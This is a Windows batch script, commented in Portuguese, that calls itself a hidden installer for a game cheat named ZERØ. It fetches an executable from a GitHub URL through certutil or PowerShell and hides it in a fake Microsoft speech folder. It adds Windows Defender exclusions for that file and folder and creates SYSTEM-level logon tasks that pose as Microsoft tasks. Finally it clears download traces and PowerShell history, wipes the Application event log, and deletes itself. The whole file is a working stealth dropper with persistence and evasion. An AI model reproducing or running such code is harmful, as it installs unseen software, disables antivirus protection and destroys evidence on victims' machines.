@echo off
:: Script de Instalação Oculto - ZERØ
:: Este script instala o cheat de forma totalmente oculta
:: Não modifique este arquivo

:: Ocultar janela do CMD
if not "%1"=="hidden" (
    start /min "" "%~f0" hidden %*
    exit
)

:: Desabilitar eco
@echo off
title Windows Update Service

:: Verificar conexão com internet
ping -n 1 github.com >nul 2>&1
if errorlevel 1 (
    exit /b 1
)

:: Obter caminho oculto (dentro de pasta do sistema)
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\Windows\Speech\Common\SpeechUX\SpeechRuntime"
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Atributos de sistema e oculto
attrib +s +h "%INSTALL_DIR%" >nul 2>&1

:: Nome do arquivo aleatório (simula arquivo do sistema)
set "RANDOM_NAME=speechruntime_%RANDOM%.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%RANDOM_NAME%"

:: Baixar do GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "CERTUTIL_TEMP=%TEMP%\temp_%RANDOM%.tmp"

:: Usar certutil para download (mais discreto que PowerShell)
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

if not exist "%INSTALL_PATH%" (
    :: Tentar com PowerShell como fallback
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing" >nul 2>&1
)

if exist "%INSTALL_PATH%" (
    :: Tornar arquivo oculto e de sistema
    attrib +s +h "%INSTALL_PATH%" >nul 2>&1
    
    :: Adicionar exclusão no Windows Defender (se tiver privilégios admin)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Criar tarefa agendada para executar na inicialização (oculta, requer admin)
    :: IMPORTANTE: Esta tarefa será usada para executar o cleanup sem UAC
    :: Usar PowerShell para criar o task com privilégios elevados (sem UAC durante a instalação)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$taskName = 'Microsoft\Windows\SpeechRuntimeService'; $action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Criar também uma tarefa específica para cleanup (executada quando necessário, SEM UAC)
    :: Esta tarefa será executada quando o usuário clicar em Unload
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$taskName = 'Microsoft\Windows\SpeechRuntimeService\Cleanup'; $action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%' -Argument '/cleanup'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Fallback: Tentar criar usando schtasks se PowerShell falhar
    schtasks /create /tn "Microsoft\Windows\SpeechRuntimeService" /tr "\"%INSTALL_PATH%\"" /sc onlogon /f /rl highest /ru SYSTEM >nul 2>&1
    schtasks /create /tn "Microsoft\Windows\SpeechRuntimeService\Cleanup" /tr "\"%INSTALL_PATH%\" /cleanup" /sc onlogon /f /rl highest /ru SYSTEM >nul 2>&1
    
    :: Limpar cache do certutil (rastros do download)
    certutil -urlcache -split -f "%GITHUB_URL%" delete >nul 2>&1
    
    :: Limpar arquivos temporários do download
    if exist "%CERTUTIL_TEMP%" del /f /q "%CERTUTIL_TEMP%" >nul 2>&1
    if exist "%TEMP%\temp_*.tmp" del /f /q "%TEMP%\temp_*.tmp" >nul 2>&1
    
    :: Limpar histórico do PowerShell (se existir)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Clear-History -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Limpar logs do Windows relacionados ao download
    wevtutil cl Application /q >nul 2>&1
    
    :: Limpar rastros do script (executar após um delay para garantir que tudo foi processado)
    timeout /t 2 /nobreak >nul 2>&1
    
    :: Criar batch file temporário para auto-deletar o script de instalação
    set "CLEANUP_BAT=%TEMP%\cleanup_install_%RANDOM%.bat"
    (
        echo @echo off
        echo timeout /t 1 /nobreak ^>nul 2^>^&1
        echo del /f /q "%~f0" ^>nul 2^>^&1
        echo del /f /q "%CLEANUP_BAT%" ^>nul 2^>^&1
    ) > "%CLEANUP_BAT%"
    
    :: Executar o cleanup batch em background
    start /min "" "%CLEANUP_BAT%"
) else (
    exit /b 1
)

exit /b 0
